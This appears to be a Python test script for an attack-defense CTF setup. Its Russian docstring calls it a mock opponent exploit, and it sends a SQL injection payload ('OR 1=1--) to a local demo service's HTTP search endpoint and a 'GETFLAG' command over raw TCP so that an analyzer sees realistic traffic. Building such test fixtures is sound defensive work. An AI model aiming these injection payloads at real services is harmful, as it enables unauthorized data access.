#!/usr/bin/env python3
"""Мок-«эксплойт соперника» для dry-run: атакует demo/vuln_service.py двумя
способами (HTTP-инъекция и сырой TCP), имитируя то, что анализатор увидит
в реальной игре.
"""

import argparse
import socket
import urllib.request


def http_attack(host="127.0.0.1", port=18080):
    req = urllib.request.Request(
        f"http://{host}:{port}/search?q=%27+OR+1%3D1--"
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read()
    print(f"[fake_attacker] HTTP exfil {host}:{port}:", body[:80])
    return body


def raw_tcp_attack(host="127.0.0.1", port=18081):
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(b"GETFLAG\n")
        data = sock.recv(1024)
    print(f"[fake_attacker] TCP exfil {host}:{port}:", data[:80])
    return data


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--http-port", type=int, default=18080)
    ap.add_argument("--tcp-port", type=int, default=18081)
    ap.add_argument("--only", choices=["http", "tcp"], default=None)
    args = ap.parse_args()
    if args.only in (None, "http"):
        http_attack(args.host, args.http_port)
    if args.only in (None, "tcp"):
        raw_tcp_attack(args.host, args.tcp_port)
